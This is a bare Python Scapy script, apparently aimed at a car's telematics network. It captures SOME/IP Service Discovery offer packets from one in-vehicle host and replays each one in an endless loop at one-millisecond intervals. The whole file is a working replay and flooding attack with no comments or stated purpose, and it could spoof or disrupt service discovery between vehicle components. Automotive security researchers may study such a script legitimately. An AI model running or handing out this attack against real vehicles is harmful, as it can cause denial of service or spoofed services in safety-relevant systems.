from scapy.all import *
from scapy.contrib.automotive.someip import *

import pdb

def process_packet(packet):
    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SD):
            print("someipsd offer!")
            sendp(packet, iface='telematics-eth0', loop=1, inter=0.001)

filter = "src host 10.0.0.4 and src port 30490 and dst port 30490"
sniff(filter=filter, iface='telematics-eth0', prn=process_packet)

